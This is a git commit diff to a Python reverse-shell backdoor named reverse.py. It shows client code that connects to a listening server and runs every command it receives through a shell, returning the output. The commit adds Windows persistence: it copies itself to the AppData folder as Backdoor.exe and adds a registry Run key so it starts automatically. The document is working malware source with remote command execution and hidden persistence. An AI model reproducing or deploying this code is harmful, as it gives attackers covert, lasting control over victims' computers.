ef8d8ad44a5186c0c2ebbc62c232aa6206a8d3b6
Jacob Taylor <100665980+jacvbtaylor@users.noreply.github.com>
2022-10-18 17:31:40 -0700

    Update reverse.py

--- reverse.py
+++ reverse.py
@@ -9,6 +9,7 @@ import subprocess
 import json
 import os
 
+
 def reliable_send(data):
 	json_data = json.dumps(data).encode()
 	sock.send(json_data)
@@ -22,16 +23,18 @@ def reliable_recv():
 		except ValueError:
 			continue
 
+
 def shell():
 	while True:
 		command = reliable_recv()
 		if command == "q":
 			break
 		elif command[:2] == "cd" and len(command) > 1:
-				try:
-					os.chdir(command[:3])
-				except:
-					continue
+			try:
+				os.chdir(command[3:])
+			except:
+				continue
+				
 		else:
 			try:
 				proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -41,9 +44,14 @@ def shell():
 			except:
 				reliable_send("[!!] Can't Execute That Command")
 
-sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+location = os.environ["appdata"] + "\\Backdoor.exe"
+if not os.path.exists(location):
+	shutil.copyfile(sys.executable, location)
+	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)
+sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #usage for ipv4 add & tcp connection to server
 sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 sock.connect(("127.0.0.1",54321)) #ip of host + desired port
 print ("CONNECTION ESTABLISHED TO SERVER")
 shell()
 sock.close()
+
